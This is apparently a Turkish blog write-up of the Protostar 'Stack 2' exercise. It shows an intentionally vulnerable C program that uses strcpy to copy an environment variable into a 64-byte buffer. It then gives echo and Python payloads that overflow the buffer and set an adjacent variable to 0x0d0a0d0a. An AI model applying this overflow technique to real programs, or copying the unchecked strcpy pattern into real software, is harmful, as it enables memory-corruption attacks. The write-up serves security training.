---
title: "Stack 2"
etiketler : "Protostar"
seriler: "Protostar"
sakla  : false
---

# Stack2.c
``` C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

**Amaç:** "you have correctly got the variable to the right value" satırını
yazdırmak.

Bu seviyede de istediğimiz cümleyi yazdırabilmek için programın akışını bir
şekilde değiştirmemiz gerekiyor. Önceki seviyede *modified* değişkeni
*0x61626364* olması yeterken şimdi kabuktaki **GREENIE** değişkeni
**0x0d0a0d0a** olmalı.

## Programın çalıştırılması
``` shell
user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable
```

Program çalıştırıldığı zaman bir önceki seviyedeki gibi herhangi bir input
beklemeden, *GREENIE* değerini atamamızı istiyor. Bir önceki seviyeden farkı
sadece programa doğrudan değil dolaylı yoldan *Kabuk değişkenini kullanarak*
program akışını değiştirecek olmamız.

Bu seviyeyide aynı şekilde uzun bir text verdikten sonra modified değişkenini
değiştirip programın akışını istediğimiz şekilde yönlendirebiliriz. Bunun için
öncelikle bufferımızı doldurup *modified*'in değerini değiştirebildiğimizi
görelim.

``` shell
# 64 Tane "A" karakteri
user@protostar:/opt/protostar/bin$ export GREENIE='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' ;
./stack2
Try again, you got 0x00000000

# 64 Tane "A" karakteri + 4 tane B
user@protostar:/opt/protostar/bin$ export GREENIE='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB' ; ./stack2
Try again, you got 0x42424242
```

Evet bu şekilde modified değişkenini istediğimiz şekilde değiştirebildiğimize
göre bölümü bitirmek için istenilen değeri yazabilliriz.

## Modified Değişkeninin Değiştirilmesi

Koddaki `if(modified == 0x0d0a0d0a)` değerini Little Endiana göre yazdığım
`0a0d0a0d` yani `\x0a\x0d\x0a\x0d` değerini yazmam gerektiğini görüyorum. Bunu
iki şekilde basitçe payloadıma ekleyebilirim.

Echo ile "`\x0a\x0d\x0a\x0d`" değerini yazdırmak istersem, hex sayıları
yazdırabilmem için _-e_ parametresini ekliyorum.

``` shell
user@protostar:/opt/protostar/bin$ export GREENIE=$(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x0d\x0a\x0d')
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

Python ile:

``` shell
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c 'print 64*"A"+"\x0a\x0d\x0a\x0d"')
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```
